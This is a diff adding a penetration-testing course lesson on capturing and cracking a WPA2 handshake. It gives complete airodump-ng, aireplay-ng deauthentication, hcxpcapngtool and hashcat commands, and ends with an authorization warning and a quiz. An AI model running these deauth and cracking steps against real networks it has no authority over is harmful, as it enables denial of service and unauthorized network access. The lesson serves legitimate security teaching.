@@ -1,0 +1,96 @@
+---
+title: Capturing and Cracking a Handshake
+module: wireless-security
+moduleTitle: Wireless Security
+moduleOrder: 20
+moduleIcon: Wifi
+order: 3
+summary: airodump to watch, aireplay to deauth, hashcat to crack. The full WPA2 capture pipeline end to end.
+estimatedMinutes: 20
+objectives:
+  - Capture a WPA2 handshake with airodump-ng and a targeted deauth
+  - Convert the capture to a hashcat-ready format
+  - Run hashcat mode 22000 against the capture with a wordlist
+tags:
+  - wireless
+  - airodump
+  - aireplay
+  - hashcat
+  - cracking
+---
+
+Three tools, one line of attack: find the target, knock a client off so it reconnects, catch the handshake it sends on the way back, then crack it on your GPU. This is the whole aircrack-ng workflow, and it is the single most-run wireless attack in the field. Set up a WPA2 test AP with a passphrase from `rockyou.txt` and follow along against that.
+
+Start in monitor mode from the first lesson. Confirm `wlan0mon` is up with `iw dev`, then survey the air to pick a target.
+
+## Find the target
+
+<CommandCard command="sudo airodump-ng wlan0mon" title="attacker@kali" explain="Scans all channels and lists every AP in range: BSSID, channel (CH), encryption (ENC), and SSID. Note your target's BSSID and channel, then Ctrl-C." />
+
+You want three facts: the AP's **BSSID**, its **channel**, and ideally the MAC of one associated client (shown in the STATION column of the lower table). Now lock airodump to that channel and BSSID and write to a file. Locking the channel is not optional. Hopping across channels while you wait for a handshake is how captures get missed.
+
+<CommandBlock
+  title="attacker@kali"
+  commands={[
+    { cmd: "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", comment: "channel 6, one BSSID, save to capture-01.cap" },
+  ]}
+/>
+
+Leave that running. The top-right of the screen shows a WPA handshake banner the moment you catch one. To get it fast, you make a client reconnect.
+
+## Force the handshake
+
+A deauth frame tells a client to disconnect. It reassociates within seconds and the four-way handshake replays, right into your open capture. In a second terminal:
+
+<CommandBlock
+  title="attacker@kali"
+  commands={[
+    { cmd: "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon", comment: "5 deauths, -a AP, -c target client MAC" },
+    { cmd: "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon", comment: "no -c: broadcast deauth to every client, use if you have no station MAC" },
+  ]}
+/>
+
+Send a small burst, five is plenty. Prefer the targeted `-c` version: it hits one device instead of knocking everyone off, which is quieter and less disruptive. Watch the airodump window for `WPA handshake: AA:BB:CC:DD:EE:FF` in the top corner. That is your capture. Stop airodump.
+
+<Callout type="warning" title="No handshake showing up?">
+Common causes: no client was actually connected (a deauth with no victim produces nothing), you were on the wrong channel, or your card cannot inject. Verify injection with `sudo aireplay-ng --test wlan0mon`. If it reports 0 packets injected, the chipset or driver is the problem, not your commands.
+</Callout>
+
+## Crack it
+
+Modern hashcat wants the 22000 format, not the raw `.cap`. Convert it with hcxpcapngtool, then run it. Mode 22000 is WPA-PBKDF2-PMKID+EAPOL, the current mode for both handshake and PMKID captures.
+
+<CommandBlock
+  title="attacker@kali"
+  commands={[
+    { cmd: "hcxpcapngtool -o hash.22000 capture-01.cap", comment: "convert the capture to hashcat's 22000 format" },
+    { cmd: "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt", comment: "straight dictionary attack" },
+    { cmd: "hashcat -m 22000 hash.22000 --show", comment: "print the cracked passphrase once it is done" },
+  ]}
+/>
+
+<ExpectedOutput label="A hit looks like this">
+```
+AA...FF:11...66:HomeNet:hunter2springs
+Status...........: Cracked
+```
+</ExpectedOutput>
+
+If you prefer the classic tool, `aircrack-ng -w rockyou.txt capture-01.cap` cracks straight from the `.cap` on CPU. It works, but hashcat on a GPU is an order of magnitude faster and takes rules, which the next module covers. Reach for hashcat.
+
+The passphrase either falls to your wordlist in minutes or it does not fall at all. That is the honest outcome of WPA2 cracking: it beats reused and human-memorable passwords and loses to random ones. Your job on an engagement is to prove the network runs the former.
+
+<Callout type="security" title="Only test networks you own">
+Deauthentication is an active denial-of-service against every client you hit, and capturing a handshake is interception. Run this entire pipeline only against an AP you own or one named in a signed authorization. There is no gray area here.
+</Callout>
+
+<Exercise
+  id="deauth-purpose"
+  prompt="In one word, what state do you force a connected client into so it replays the four-way handshake you want to capture?"
+  answer="disconnect"
+  placeholder="one word"
+>
+The deauth frame drops the client. When it reconnects, the handshake replays into your open airodump capture.
+</Exercise>
+
+<Notes />
